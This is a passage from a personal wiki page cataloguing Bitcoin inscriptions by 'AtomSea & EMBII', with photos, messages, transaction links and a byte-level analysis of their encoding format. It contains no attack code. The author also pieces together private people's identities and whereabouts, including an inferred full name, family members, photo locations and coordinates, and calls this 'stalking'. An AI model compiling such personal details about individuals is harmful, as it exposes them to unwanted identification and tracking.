![](https://web.archive.org/web/20230604104715im_/http://bitfossil.org/966e090d19172b6a6f988b1f1d32141492349279cedd2a436d7a2143c67d7af4/Chiharu%20EMBII%20and%20The%20Atom%20Sea%20say%20Happy%20Halloween.jpg)

**[Figure 28](#image-chiharu-embii-and-the-atom-sea-say-happy-halloween-jpg). `Chiharu EMBII and The Atom Sea say Happy Halloween.jpg`**. [Source](https://bitfossil.org/root/966e090d19172b6a6f988b1f1d32141492349279cedd2a436d7a2143c67d7af4/index.htm). <a id="_367"></a>
Message:<a id="_368"></a>


> \#Chiharu \#embii & the \#AtomSea \#Fargo \#ND

so their location was: [https://en.wikipedia.org/wiki/Fargo,_North_Dakota](https://en.wikipedia.org/wiki/Fargo,_North_Dakota)

<a id="_369"></a>
[tx 966e090d19172b6a6f988b1f1d32141492349279cedd2a436d7a2143c67d7af4](https://www.blockchain.com/explorer/transactions/btc/966e090d19172b6a6f988b1f1d32141492349279cedd2a436d7a2143c67d7af4), [block 401592](https://www.blockchain.com/explorer/blocks/btc/401592) (2016-03-07)

---

<a id="image-chiharu-jpg"></a>
![](https://web.archive.org/web/20220125102522im_/http://bitfossil.org/366bfe5b135ffc52894f67f53936ec2ec693cad61c64e52f1624ef22815d4de7/Chiharu.jpg)

**[Figure 29](#image-chiharu-jpg). `Chiharu.jpg`**. [Source](https://bitfossil.org/root/366bfe5b135ffc52894f67f53936ec2ec693cad61c64e52f1624ef22815d4de7/). <a id="_370"></a>
Messages:<a id="_371"></a>


> mini camera test \#Wilson \#Chiharu \#embii \#Broadway \#Fargo \#ND

and:<a id="_372"></a>


> "Trip to [Italy](continent.md#italy)" Mini Digital Camera N. Broadway, Fargo, ND 49°F

TODO actual [Italy](continent.md#italy)? Or some place named Italy in the US? One of the photos is from the [First Lutheran church in Fargo, Nort Dacota](https://www.flcfargo.org/).

<a id="_373"></a>
[tx 366bfe5b135ffc52894f67f53936ec2ec693cad61c64e52f1624ef22815d4de7](https://www.blockchain.com/explorer/transactions/btc/366bfe5b135ffc52894f67f53936ec2ec693cad61c64e52f1624ef22815d4de7), [block 401592](https://www.blockchain.com/explorer/blocks/btc/401592) (2016-03-07)

---

<a id="image-loraine-jpg"></a>
<img src="https://web.archive.org/web/20220125103038im_/http://bitfossil.org/b4b8fe752a258f95b191b8c5426319ee0e8d41d5db53ea2ae18beed141cbb9bd/Melanie%20Loraine%20Eric.jpg" alt="" height="600">

**[Figure 30](#image-loraine-jpg). `Loraine.jpg`**. [Source](https://bitfossil.org/root/b4b8fe752a258f95b191b8c5426319ee0e8d41d5db53ea2ae18beed141cbb9bd/index.htm). <a id="_374"></a>
"Loraine" on [tx b4b8fe752a258f95b191b8c5426319ee0e8d41d5db53ea2ae18beed141cbb9bd](https://www.blockchain.com/explorer/transactions/btc/b4b8fe752a258f95b191b8c5426319ee0e8d41d5db53ea2ae18beed141cbb9bd), [block 448352](https://www.blockchain.com/explorer/blocks/btc/448352) (2017-01-15).

<a id="_375"></a>
Photographer unknown, but presumably EMBII's father or another close family member.

<a id="_376"></a>
Message:<a id="_377"></a>


> In loving memory of Loraine Elizabeth White

[EMBII](software.md#embii)'s mum died :-(

<a id="_378"></a>
Cost: ~0.001 BTC ~ $0.80 at the time.

<a id="_379"></a>
[https://x.com/EMBII4U/status/1940802996851634198](https://x.com/EMBII4U/status/1940802996851634198) comments on the effect his mother's death had on him:<a id="_380"></a>


> <a id="_381"></a>
> I was dealing with severe depression brought about by life and the loss of my mom
> 
> <a id="_382"></a>
> was too many things left unsaid

---

<a id="image-satofamily-jpg"></a>
![](https://web.archive.org/web/20220125102514if_/http://bitfossil.org/94ba41330b7bfb1e6528497e3b1dd21018c63a7f163e0bc9281c21cc1071462e/SatoFamily.jpg)

**[Figure 31](#image-satofamily-jpg). `SatoFamily.jpg`**. [Source](https://bitfossil.org/root/94ba41330b7bfb1e6528497e3b1dd21018c63a7f163e0bc9281c21cc1071462e/index.htm). <a id="_383"></a>
[94ba41330b7bfb1e6528497e3b1dd21018c63a7f163e0bc9281c21cc1071462e](https://www.blockchain.com/explorer/transactions/btc/94ba41330b7bfb1e6528497e3b1dd21018c63a7f163e0bc9281c21cc1071462e), [block 450516](https://www.blockchain.com/explorer/blocks/btc/450516) (2017-01-29)

<a id="_384"></a>
This one gives Chiharu's full identity with picture basically. Message:<a id="_385"></a>


> The Sato Family Arrives from [Japan](japan.md)! Taken Aug 2. 2014 in Minneapolis MN. (Keiko, Chiharu, Hideaki, Katsuhiko) Now preparing for the Sato / Bobby Great American Vacation!!

so presumably Chiharu's full name is Chiharu Sato.

<a id="_386"></a>
More from their vacation:<a id="_387"></a>

<a id="_388"></a>
- [https://bitfossil.org/root/fa15ac78927bf9a4a99c259f554b4c24715f69e548aeea8a8f5552b0215ce028/](https://bitfossil.org/root/fa15ac78927bf9a4a99c259f554b4c24715f69e548aeea8a8f5552b0215ce028/) yellowstone.jpg

---

<a id="_389"></a>
More EMBII [social media](social-technology.md#social-media):<a id="_390"></a>

<a id="_391"></a>
- [https://bitfossil.org/root/5bfd6eab2df2eb615dd72172408e02e07fddba2f00fed9b80cd66c0b115ee03d/index.htm](https://bitfossil.org/root/5bfd6eab2df2eb615dd72172408e02e07fddba2f00fed9b80cd66c0b115ee03d/index.htm) "Found on Mady's camera", EMBII wearing a funny red suit and drinking orange juice

<h6 id="nelson-mandela-jpg">Nelson-Mandela.jpg</h6>

↑ **Parent:** [Early AtomSea & EMBII uploads](#early-atomsea-and-embii-uploads)

<a id="_393"></a>
[https://bitfossil.org/root/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e/](https://bitfossil.org/root/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e/) in block [273536](https://www.blockchain.com/explorer/transactions/btc/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e) (2013-12-07).

<a id="_394"></a>
This is one of the [earliest AtomSea & EMBII uploads](#early-atomsea-and-embii-uploads).

<a id="image-nelson-mandela-jpg"></a>
![](https://web.archive.org/web/20211017061608im_/http://bitfossil.com/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e/Nelson-Mandela.jpg)

**[Figure 32](#image-nelson-mandela-jpg). `Nelson-Mandela.jpg`**. [Source](https://bitfossil.org/root/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e/). Message:<a id="_395"></a>
> "There is nothing like returning to a place that remains unchanged to find the ways in which you yourself have altered." - Nelson Mandela Nelson Rolihlahla Mandela was a South African anti-apartheid revolutionary, politician and philanthropist who served as President of South Africa from 1994 to 1999. - Wikipedia Born: July 18, 1918, Mvezo, South Africa Died: December 5, 2013.

---

<h6 id="nelson-mandela-jpg-analysis">Nelson-Mandela.jpg analysis</h6>

↑ **Parent:** [Nelson-Mandela.jpg](#nelson-mandela-jpg)

<a id="_396"></a>
The toplevel transaction is 78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e

<a id="_397"></a>
Like all [AtomSea & EMBII](#atomsea-and-embii) uploads, the data it is encoded as [P2FKH](cryptocurrency.md#fake-p2pkh-address).

<a id="_398"></a>
The full concatenated payload contains the following [ASCII](telecommunication.md#ascii) characters:

<a id="_399"></a>
```
8881a937a437ff6ce83be3a89d77ea88ee12315f37f7ef0dd3742c30eef92dba|396*8881a937a437ff6ce83be3a89d77ea88ee12315f37f7ef0dd3742c30eef92dba
575061146335bd57f2dc132112152d0eeea44cf187ea6a52ac02435a7e5bea44
674c7cc34ea44bb276c6caf76f2b28fa1597380ab6e6a6906076d8f7229ca5b3
8e2642416ad20924b43f51a633fa1c0a5ba8e4a7b631877db1c64540a42081c9
a3084018096b92af04df57b6116e01ff4b7c7e8bd228235ed49e23f4a2817029
39348722b841afa0c5b67e5af10839afe965ed1b24874e89336bea9fa4ef3091
tomSea & EMBII
```

<a id="_400"></a>
Output 2 is a [change](cryptocurrency.md#change-bitcoin), so it contains no data and has been excluded. Change appear to be randomly placed in the list of output of the uploads, but they can be easily removed because they are the only output with a different value.

<a id="_401"></a>
The newlines shown above are explicitly encoded as CR LF newlines with characters 0d 0a.

<a id="_402"></a>
`396` is the number of payload bytes between `396*8881a937a437ff6ce83be3a89d77ea88ee12315f37f7ef0dd3742c30eef92dba` and the last txid `39348722b841afa0c5b67e5af10839afe965ed1b24874e89336bea9fa4ef3091`, including newlines but exclusding the last line.

<a id="_403"></a>
The last line appears to contain arbitrary data to fill out the 20 byte payload granularity:<a id="_404"></a>

<a id="_405"></a>
- `A` is missing from `AtomSea`
<a id="_406"></a>
- there is a NUL character just after EMBII, possibly part of the protocol?

<a id="_407"></a>
Now let's inspect the transactions linked to from toplevel.

<a id="_408"></a>
tx 8881a937a437ff6ce83be3a89d77ea88ee12315f37f7ef0dd3742c30eef92dba contains only payloads without any change. It starts with the following [UTF-8](telecommunication.md#utf-8) string with CR LF spaces;<a id="_409"></a>

```
"396\“There is nothing like returning to a place
 that remains unchanged to find the ways in
 which you yourself have altered.”
 -Nelson Mandela


Nelson Rolihlahla Mandela was a South African anti-apartheid revolutionary, politician and philanthropist who served as President of South Afrd۽^2c'︨`ica from 1994 to 1999. -Wikipedia

Born: July 18, 1918, Mvezo, South Africa
Died: December 5, 2013
```

<a id="_410"></a>
`396` is once again the number of payload bytes present in that string.

<a id="_411"></a>
This is immediately followed without any separator by a filename, and another size marker:<a id="_412"></a>

```
Nelson-Mandela.jpg?14400/
```
then followed by all the `14400 - len(Nelson-Mandela.jpg?) + len(/)` JPEG bytes bytes, starting with the two [JPEG file signature](computer.md#jpeg-file-signature) byte "FF D8".

<a id="_413"></a>
Further toplevel transaction payloads are then simply concatenated with the previous ones, until the last bytes of the image "FF D9" appears at the end of the payload.<a id="_414"></a>

```
00000430  d2 81 de 80 0c 52 f1 40  ea 29 68 03 ff d9 6f 6d  |.....R.@.)h...om|
00000440  53 65 61 20 26 20 45 4d  42 49 49 00              |Sea & EMBII.|
```
padded once again by an `AtomSea & EMBII` string fragment terminated by a NUL character.

<h5 id="interesting-atomsea-and-embii-uploads">Interesting AtomSea &amp; EMBII uploads</h5>

↑ **Parent:** [AtomSea & EMBII](#atomsea-and-embii)

<a id="_415"></a>
[tx e3e37ed5c1de2631c147bd39429e42ff634e95b7d72423bc32d6c6b9d8eef8ee](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0308.txt#L133) ([2014-07-01](https://www.blockchain.com/explorer/transactions/btc/e3e37ed5c1de2631c147bd39429e42ff634e95b7d72423bc32d6c6b9d8eef8ee)):<a id="_416"></a>


> For my first official Journal entry I've decided to archive some old poetry. Here are a few of the computational poems I've created using cyphers.

<a id="image-shiemaa-and-vincent-jpg"></a>
![](https://web.archive.org/web/20230604094933im_/http://bitfossil.org/36d0d77acd760f0aa549b6b314f0c1e9690baa6bcc2d0f07ea9f3167f4a5ec99/Shiemaa&amp;Vincent.jpg)

**[Figure 33](#image-shiemaa-and-vincent-jpg). `Shiemaa&Vincent.jpg`**. [Source](https://bitfossil.org/root/36d0d77acd760f0aa549b6b314f0c1e9690baa6bcc2d0f07ea9f3167f4a5ec99/index.htm). <a id="_417"></a>
Message:<a id="_418"></a>


> "Even if we tried to do it on purpose, never would have we succeeded." My beloved Vincent.

TODO identify Shiemaa and Vincent.

<a id="_419"></a>
[tx 36d0d77acd760f0aa549b6b314f0c1e9690baa6bcc2d0f07ea9f3167f4a5ec99](https://www.blockchain.com/explorer/transactions/btc/36d0d77acd760f0aa549b6b314f0c1e9690baa6bcc2d0f07ea9f3167f4a5ec99), [block 318836](https://www.blockchain.com/explorer/blocks/btc/318836) (2014-09-03)Cost: ~0.002 BTC ~ $0.77 at the time.

---

<a id="_420"></a>
Several other interesting uploads were also made around [block 318836](https://www.blockchain.com/explorer/blocks/btc/318836) (September 2014):<a id="_421"></a>

<a id="_422"></a>
- `RedRaven.jpg` [https://bitfossil.org/root/e17b83234402d85f3a18207eec11bc5c4397f88aa880aae4fb7d15802806a971/index.htm](https://bitfossil.org/root/e17b83234402d85f3a18207eec11bc5c4397f88aa880aae4fb7d15802806a971/index.htm)
<a id="_423"></a>
- `Earth3Archive.jpg` [https://bitfossil.org/root/ae8d3b46b934bedc363e11abe8c8607171994470957c286274f699a0b3a9bbd7/index.htm](https://bitfossil.org/root/ae8d3b46b934bedc363e11abe8c8607171994470957c286274f699a0b3a9bbd7/index.htm)
<a id="_424"></a>
- `SkyEarth5Archive.jpg` [https://bitfossil.org/root/ae8d3b46b934bedc363e11abe8c8607171994470957c286274f699a0b3a9bbd7/index.htm](https://bitfossil.org/root/ae8d3b46b934bedc363e11abe8c8607171994470957c286274f699a0b3a9bbd7/index.htm)

<a id="image-bikelady-jpg"></a>
<img src="https://web.archive.org/web/20230926202205im_/http://bitfossil.org/2c4b9497af8c0c0eb9383357b40c3de33dba0b4f481099a32719f2b9036da8e7/BikeLady.jpg" alt="" height="600">

**[Figure 34](#image-bikelady-jpg). `BikeLady.jpg`**. [Source](https://bitfossil.org/root/2c4b9497af8c0c0eb9383357b40c3de33dba0b4f481099a32719f2b9036da8e7/). <a id="_425"></a>
Bike Lady by [Allen Lee Vandever](https://ourbigbook.com/go/topic/allen-lee-vandever). [tx 2c4b9497af8c0c0eb9383357b40c3de33dba0b4f481099a32719f2b9036da8e7](https://www.blockchain.com/explorer/transactions/btc/2c4b9497af8c0c0eb9383357b40c3de33dba0b4f481099a32719f2b9036da8e7), [block 319927](https://www.blockchain.com/explorer/blocks/btc/319927) (2014-09-10)

<a id="_426"></a>
This seems to be a novel work uploaded by its creator artist [Allen Vandever](https://ourbigbook.com/go/topic/allen-vandever) according to [EMBII](software.md#embii).[https://x.com/EMBII4U/status/1831772369414730109](https://x.com/EMBII4U/status/1831772369414730109).

---

<a id="image-arecibo-message-svg"></a>
<img src="https://web.archive.org/web/20220125100229/http://bitfossil.org/c6d2e535cd2ba4659e954a61198c66fd98c60f6475cf8ff92a404f3fe3a16c4b/Arecibo_message.svg" alt="" height="800">

**[Figure 35](#image-arecibo-message-svg). `Arecibo_message.svg`**. [Source](https://bitfossil.org/root/c6d2e535cd2ba4659e954a61198c66fd98c60f6475cf8ff92a404f3fe3a16c4b/index.htm). <a id="_427"></a>
[Arecibo message](taxonomy.md#arecibo-message) on [tx c6d2e535cd2ba4659e954a61198c66fd98c60f6475cf8ff92a404f3fe3a16c4b](https://www.blockchain.com/explorer/transactions/btc/c6d2e535cd2ba4659e954a61198c66fd98c60f6475cf8ff92a404f3fe3a16c4b), [block 337874](https://www.blockchain.com/explorer/blocks/btc/337874) (2015-01-07)

<a id="_428"></a>
An "artificially" colored visualization of the [Arecibo message](taxonomy.md#arecibo-message) ripped from [Wikipedia](website.md#wikipedia): [https://en.wikipedia.org/wiki/File:Arecibo_message.svg](https://en.wikipedia.org/wiki/File:Arecibo_message.svg) (with attribution).

<a id="_429"></a>
The cool thing about this image is that it highlights the striking parallels between the encoding of the Arecibo message with crypto graffiti, because in both cases people were creating undocumented new ways of communicating with strangers on a new medium in those early blockchain days.

<a id="_430"></a>
The associated message contains the Arecibo message as ASCII 0's and 1's. When properly cut at the newlines, they draw the message as [ASCII art](art.md#ascii-art), as the original Arecibo encoding intends, here's a version with the 0's replaced by spaces to make it more readabale:<a id="_431"></a>

```
      1 1 1 1
  1 1     1 1       1
1   1   1   1  1 11  1
1 1 1 1 1 1 1 1  1  1

            11
          11 1
          11 1
          1 1 1
          11111

11    111   11    11
1             11  1
11 1   11   11    11 1
11111 11111 11111 11111

    1                 1

    1                 1
11111             11111

11    11    111   11
1       1         1
11 1    11   111  11 1
11111 11111 11111 11111

    1      11         1
          11
    1     11          1
11111     11      11111
          11
  1        1        1
    1      11       1
    11    11      1
      11   1    11
          11  11
      11   1    11
    11    11      1
    1      1        1
  1       11        1
  1        11        1
  1         1       1
  1       1       1
    1            11
    11        11
  1   111 1 11
  1       1
  1     11111
  1    1 111 1  1 11 11
      1  111  1  111111
1 111    111     11 111
          1 1     111 11
  1      1 1     111111
  1      1 1     11
  1     11 11

  111     1
  111 1 1   1 1 1 1 1 1
  111         1 1 1 1
              1 1
        11111
      111111111
    111       111
    11           11
  11 1         1 11
  11  11       11  11
  1   1 1     1 1   1
  1   1  1   1  1   1
      1   1 1   1
      1    1    1
      1         1
        1  1 1
  1111  11111 1  1111
```

---

<a id="image-he-sleeps-in-a-temple-jpg"></a>
<img src="https://web.archive.org/web/20230604101557im_/http://bitfossil.org/460ed23bea89176cdfe18e13fce51ad5386ad8e3e1f7d6f5b4711b3be97b0502/He%20sleeps%20in%20a%20temple.jpg" alt="" height="600">

**[Figure 36](#image-he-sleeps-in-a-temple-jpg). `He sleeps in a temple.jpg`**. [tx 460ed23bea89176cdfe18e13fce51ad5386ad8e3e1f7d6f5b4711b3be97b0502](https://www.blockchain.com/explorer/transactions/btc/460ed23bea89176cdfe18e13fce51ad5386ad8e3e1f7d6f5b4711b3be97b0502) block 360565 (2015-06-12). [EMBII](software.md#embii) [claimed on Twitter](https://x.com/EMBII4U/status/1868268170739605927) that he took this [photo](technology.md#photography) in Auckland, New Zealand. The shop on the right corner has a sign that starts with "Bo" and searching for "Auckland Bo" gave us the ["The body shop" on the corner of Queen Street and Darby Street](https://www.google.com/maps/@-36.8496864,174.7650978,3a,67y,298.15h,86.46t/data=!3m8!1e1!3m6!1sW95zfXdJo7SgApOXsUAGmQ!2e0!5s20151001T000000!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D3.5408984320183237%26panoid%3DW95zfXdJo7SgApOXsUAGmQ%26yaw%3D298.14685162237225!7i13312!8i6656?entry=ttu&g_ep=EgoyMDI0MTIxMS4wIKXMDSoASAFQAw%3D%3D). Some things changed between 2015 and 2024, notably the bench is gone and the shop on the left corner changed, but we can go back in time in [Google Street View](software.md#google-street-view) to 2015 which further confirms the location.

<a id="image-pia17563-jpg"></a>
<img src="https://web.archive.org/web/20240202113630im_/http://bitfossil.org/4fb8620ccff8015a74cd3522f6dbee2821a0db48185f919050fb1ee572f30921/PIA17563.jpg" alt="" height="600">

**[Figure 37](#image-pia17563-jpg). PIA17563.jpg**. [Source](https://bitfossil.org/root/4fb8620ccff8015a74cd3522f6dbee2821a0db48185f919050fb1ee572f30921/). <a id="_432"></a>
Associated message:<a id="_433"></a>


> [NASA](astronomy.md#nasa): A purple nebula, in honor of \#Prince, who passed away today. Image: Crab \#Nebula, as Seen by Herschel and \#Hubble Image credit: ESA/Herschel/PACS/MESS Key Programme Supernova Remnant Team; \#NASA, ESA and Allison Loll/Jeff Hester (Arizona State University) \#PIA17563

<a id="_434"></a>
[tx 4fb8620ccff8015a74cd3522f6dbee2821a0db48185f919050fb1ee572f30921](https://www.blockchain.com/btc/tx/4fb8620ccff8015a74cd3522f6dbee2821a0db48185f919050fb1ee572f30921) (2016-04-21)

---

<a id="image-dr-craig-wright-jpg"></a>
<img src="https://web.archive.org/web/20210925230041im_/http://bitfossil.com/b58e817c7fcd2552a6934cd64ff58d0405f81ea0786d3cd85c225ffe20b9018a/Dr_Craig_Wright.jpg" alt="" height="500">

**[Figure 38](#image-dr-craig-wright-jpg). Dr\_Craig\_Wright.jpg**. [Source](https://bitfossil.org/root/b58e817c7fcd2552a6934cd64ff58d0405f81ea0786d3cd85c225ffe20b9018a/). <a id="_435"></a>
[tx b58e817c7fcd2552a6934cd64ff58d0405f81ea0786d3cd85c225ffe20b9018a](https://www.blockchain.com/btc/tx/b58e817c7fcd2552a6934cd64ff58d0405f81ea0786d3cd85c225ffe20b9018a) (2016-06-20)

<a id="_436"></a>
Associated message:<a id="_437"></a>


> Is [\#Satoshi \#Nakamoto](cryptocurrency.md#satoshi-nakamoto) [\#CraigWright?](cryptocurrency.md#craig-steven-wright) [\#SatoshiNakamoto](cryptocurrency.md#satoshi-nakamoto) [\#Craig \#Steven \#Wrigh](cryptocurrency.md#craig-steven-wright)

<a id="_438"></a>
The image is present e.g. at: [https://www.kitguru.net/channel/jon-martindale/australian-man-claims-he-is-satoshi-nakamoto-bitcoin-creator/](https://www.kitguru.net/channel/jon-martindale/australian-man-claims-he-is-satoshi-nakamoto-bitcoin-creator/) It was inscribed about two months after Craig publicly claimed that he is Satoshi.

<a id="_439"></a>
This is a relatively unusual [AtomSea & EMBII](#atomsea-and-embii) upload as it does not have the common toplevel transaction, everything, text + image fits into a single transaction. This is perhaps why the image is relatively low resolution to have a smaller size.

---

<a id="image-yellowrobot-jpg"></a>
<img src="https://web.archive.org/web/20220102092623im_/http://bitfossil.org/4cbb32cd27b5b5edc12d3559bdffc1355ac2a210463d5cfaadc7ce9b06675b2b/YellowRobot.jpg" alt="" height="600">

**[Figure 39](#image-yellowrobot-jpg). `YellowRobot.jpg`**. [Source](https://bitfossil.org/root/67b2facfd8160d4fa11b02829b6387d07537b57a7a24f19b029b2a5ae7b81830/). <a id="_440"></a>
Yellow Robot on [tx 67b2facfd8160d4fa11b02829b6387d07537b57a7a24f19b029b2a5ae7b81830](https://bitfossil.org/67b2facfd8160d4fa11b02829b6387d07537b57a7a24f19b029b2a5ae7b81830/), [block 450516](https://www.blockchain.com/explorer/blocks/btc/450516) (2017-01-29)

<a id="_441"></a>
[Photography](technology.md#photography) by [EMBII](software.md#embii), original art by TODO.

<a id="_442"></a>
The associated message reads:<a id="_443"></a>


> Chiharu and I found this little yellow robot while exploring Chicago. It will be covered by tar or eventually removed but this tribute will remain. N 41.880778 E -87.629210

This is one of Ciro's favorite AtomSea & EMBII uploads. This is the cutest thing ever, and perfectly encapsules the "medium as an artform" approach to blockchain art. More Chiharu stalking at: [ILoveYouMore.jpg](#iloveyoumore-jpg).

<a id="_444"></a>
At [https://twitter.com/EMBII4U/status/1615389973343268871](https://twitter.com/EMBII4U/status/1615389973343268871) [EMBII](software.md#embii) announced that he would be giving off shares of that image on a [Bitcoin](cryptocurrency.md#bitcoin)-based [NFT](cryptocurrency.md#non-fungible-token) sale system he's making called [Sup!?](cryptocurrency.md#sup-p2fk-client), and in December 2023 gave 2/300 shares to [Ciro Santilli](ciro-santilli.md). Amen. The transaction list can be seen on the web UI at: [https://p2fk.io/GetObjectByAddress/1KUyhHLrK1ckY8W7Qu31h6gFkXoihWHMzi?mainnet=true&verbose=true](https://p2fk.io/GetObjectByAddress/1KUyhHLrK1ckY8W7Qu31h6gFkXoihWHMzi?mainnet=true&verbose=true) It had unfortunately never sold as of 2025, the only activity was [EMBII](software.md#embii) giving off some shares and two listings of 1/300 for 1 BTC. Poor EMBII!

<a id="_445"></a>
Other possibly novel EMBII street [photography](technology.md#photography):<a id="_446"></a>

<a id="_447"></a>
- [https://bitfossil.org/root/f2efd446475ad58a3ea808cc0f05a63c55cece9fced70d84799a1ffce5d307e4/index.htm](https://bitfossil.org/root/f2efd446475ad58a3ea808cc0f05a63c55cece9fced70d84799a1ffce5d307e4/index.htm) "I will not Stop until the Finite becomes the Infinite."

---

<a id="_448"></a>
Audio:<a id="_449"></a>

<a id="_450"></a>
- `alien.wav` block 318638 [https://bitfossil.org/root/a3a24d6ea01ce481a50346818b8977220687f3ba385838fe8894ce61c9718bbc/](https://bitfossil.org/root/a3a24d6ea01ce481a50346818b8977220687f3ba385838fe8894ce61c9718bbc/)
<a id="_451"></a>
- <a id="_452"></a>
  `OneGiantLeapForMankind.mp3` at [tx 4f5b25fa8021c67235423930580e69121aa0d2c2bb779f75139bf442f8dc7297](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0319.txt#915) EMBII-indexed at 743f3286b00fc96c13db4b16d5aead8a1e059fee9ce775b1761be9be5bdc2501 and then indexed at: 0427ec598df38b7d7dc75721316c0bbdec54de4871e11aff8ea64f3717c07efb

  <a id="_453"></a>
  The toplevel index does appear on Bitfossil: [https://bitfossil.org/root/0427ec598df38b7d7dc75721316c0bbdec54de4871e11aff8ea64f3717c07efb/index.htm](https://bitfossil.org/root/0427ec598df38b7d7dc75721316c0bbdec54de4871e11aff8ea64f3717c07efb/index.htm) but the audio is not there as it was for Spock below, maybe a bug on upload/Bitfossil?
<a id="_454"></a>
- `Spock_Live_Long_And_Prosper.mp3` block 345858 [https://bitfossil.org/root/1bc87dbff1ff5831287f62ac7cf95579794e4386688479bab66174963f9a4a0c/index.htm](https://bitfossil.org/root/1bc87dbff1ff5831287f62ac7cf95579794e4386688479bab66174963f9a4a0c/index.htm). Audio of [Mr. Spock](television-series.md#spock) saying the Vulcan salute.
<a id="_455"></a>
- <a id="_456"></a>
  `OuterSpace.mp3` block 409471 [https://bitfossil.org/root/c14c1bd862bab6269052bf0a2cda7a35940d7a2d9c3415d4fb8fb8dcb9394fae/](https://bitfossil.org/root/c14c1bd862bab6269052bf0a2cda7a35940d7a2d9c3415d4fb8fb8dcb9394fae/) "Outer Space by embii 4MB Large file storage test Apertus 0.3.5-beta" OMG, I don't want to calculate how much it cost to upload this, it will make me sad.

  <a id="_457"></a>
  At [https://twitter.com/EMBII4U/status/1655969645927563266](https://twitter.com/EMBII4U/status/1655969645927563266) EMBII mentions that this inscription, made by him, is the largest inscription he knows of.

  <a id="_458"></a>
  TODO song composer/performer?
<a id="_459"></a>
- [https://bitfossil.org/root/c2b170ff450f4529dfbd784e0cf5cdddaca494e67a243dd846c0a9450a5558af/](https://bitfossil.org/root/c2b170ff450f4529dfbd784e0cf5cdddaca494e67a243dd846c0a9450a5558af/) (2021-03-13) contains `Seikilos.mid`, a [MIDI](computer.md#midi) file

<a id="_460"></a>
Interesting text:<a id="_461"></a>

<a id="_462"></a>
- block 273522 [https://bitfossil.org/root/70fd289901bae0409f27237506c330588d917716944c6359a8711b0ad6b4ce76/index.htm](https://bitfossil.org/root/70fd289901bae0409f27237506c330588d917716944c6359a8711b0ad6b4ce76/index.htm) [pi](formalization-of-mathematics.md#pi) to 1000+ decimal digits:
<a id="_463"></a>
- [https://bitfossil.org/root/8522787e7e49f3f3b6a9f9e86bc30336d26a3acbaecc93809d2e8b4bb1c4d611/](https://bitfossil.org/root/8522787e7e49f3f3b6a9f9e86bc30336d26a3acbaecc93809d2e8b4bb1c4d611/) "Antarctic Ice Cores Revised 800KYr CO2 Data" evidence for [global warming](astronomy.md#global-warming)
<a id="_464"></a>
- [https://bitfossil.org/root/ffa6893a70bcde9b940df9823e0f597f0b6cff964c78473c77db838655e1aeb5/](https://bitfossil.org/root/ffa6893a70bcde9b940df9823e0f597f0b6cff964c78473c77db838655e1aeb5/) [https://en.wikipedia.org/wiki/Laudato_si'](https://en.wikipedia.org/wiki/Laudato_si'), [global warming](astronomy.md#global-warming) related

<a id="_465"></a>
[HTML](web-technology.md#html) pages:<a id="_466"></a>

<a id="_467"></a>
- block 335290 [https://bitfossil.org/root/0166db6053f1969c28de8b1f9a8fa4ec890cc4bdfee7602757993b306bb7f295/](https://bitfossil.org/root/0166db6053f1969c28de8b1f9a8fa4ec890cc4bdfee7602757993b306bb7f295/) [JavaScript](programming-language.md#javascript) animated timer clock counting down until the start of the next year
<a id="_468"></a>
- block 340379 [https://bitfossil.org/root/062990d54045a9c316110fb713009d1313b2f64c4b216d66891c7284d6c1ca0e/](https://bitfossil.org/root/062990d54045a9c316110fb713009d1313b2f64c4b216d66891c7284d6c1ca0e/) links to [https://bitfossil.org/root/062990d54045a9c316110fb713009d1313b2f64c4b216d66891c7284d6c1ca0e/bong-ball.html](https://bitfossil.org/root/062990d54045a9c316110fb713009d1313b2f64c4b216d66891c7284d6c1ca0e/bong-ball.html) and has a working [JavaScript](programming-language.md#javascript) [Pong](video-game.md#pong)
<a id="_469"></a>
- block 328445 `tom-signature.jpg` [https://bitfossil.org/root/daa050bf8ac22752e40412c9265b4533f68ab8e6ed26d2db1eeee6710e7d9e4b/index.htm](https://bitfossil.org/root/daa050bf8ac22752e40412c9265b4533f68ab8e6ed26d2db1eeee6710e7d9e4b/index.htm) Unrendered HTML of:<a id="_470"></a>

  <a id="_471"></a>
  - [https://www.cartalk.com/content/tom-and-rays-bios-photos-2](https://www.cartalk.com/content/tom-and-rays-bios-photos-2)
  <a id="_472"></a>
  - [https://www.cartalk.com/content/rant-and-rave-36](https://www.cartalk.com/content/rant-and-rave-36) "The New Theory of Learning" which agrees perfectly with [backward design](cirism.md#backward-design)

  Likely an obituary for: [Thomas L. Magliozzi](https://en.wikipedia.org/wiki/Tom_and_Ray_Magliozzi). Images show fine though.
<a id="_473"></a>
- block 401648 [https://bitfossil.org/root/31c5e5336512568e4a1deb4bbf0e57c3565c32094c0e1a118c48e7929ab49e35/bong-ball.html](https://bitfossil.org/root/31c5e5336512568e4a1deb4bbf0e57c3565c32094c0e1a118c48e7929ab49e35/bong-ball.html) another one! This one is full-screen, and does not have [JavaScript](programming-language.md#javascript) `alert`s :-)
<a id="_474"></a>
- block 401657 [https://bitfossil.org/root/03cb74f270d498302d4dd9cbe82c090d801c8840ab6cb26b71d862489b981db8/](https://bitfossil.org/root/03cb74f270d498302d4dd9cbe82c090d801c8840ab6cb26b71d862489b981db8/) has a [JavaScript](programming-language.md#javascript) [Pac-Man](video-game.md#pac-man)

<h5 id="atomsea-and-embii-data-format">AtomSea &amp; <a href="software.html#embii">EMBII</a> data format</h5>

↑ **Parent:** [AtomSea & EMBII](#atomsea-and-embii)

<a id="_475"></a>
For a detailed analysis of one transaction see: [Nelson-Mandela.jpg](#nelson-mandela-jpg).

<a id="_476"></a>
Best guess so far, all in ASCII hex of output scripts:<a id="_477"></a>

<a id="_478"></a>
- remove the single output value different from first one from payload, that's the change, and it is randomly placed as far as I see
<a id="_479"></a>
- 64 bytes: hex address of top level text
<a id="_480"></a>
